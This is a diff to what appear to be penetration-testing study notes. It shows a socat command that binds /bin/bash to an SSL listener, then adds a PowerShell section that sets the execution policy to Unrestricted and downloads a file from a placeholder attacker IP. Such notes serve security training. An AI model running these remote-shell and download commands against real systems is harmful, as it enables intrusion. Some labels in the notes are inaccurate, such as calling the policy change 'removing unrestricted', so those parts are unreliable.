@@ -212,3 +212,27 @@ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem, verify=0,fork EXEC:/bin/bash
 ```
 
 _note:- We will use *-* to transfer data between STDIO and  *OPENSSL* to establish a remote SSL connection to Alice's listener, *verify=0* to disable SSL certificate verification_
+
+# Powershell and Powercat
+Windows PowerShell is a task-based command line shell and scripting language. It is designed specifically for system administrators and power-users to rapidly automate the administration of multiple operating systems and the processes related to the applications that run on them.
+- Windows Powershell 5.0 - windows server 2008,2012 R2 and windows 7.
+
+- Windows Powershell 4.0 - Win 8.1/Win Server 2012 R2, Win 7 2008
+- Windows Powershell 3.0 - Win 8;Win Server 2012, win 7,2008
+
+removing unrestricted powershell
+```powershell
+    Set-ExecutionPolicy Unrestricted
+
+```
+press y;
+```powershell
+    Get-ExecutionPolicy 
+```
+## PowerShell FIle Transfers
+
+```powershell
+    powershell -c "(new-object System.Net.Webclient).DownloadFile('http://<ip>/<file_name>','<destination>')"
+    
+    wget.exe -V
+```
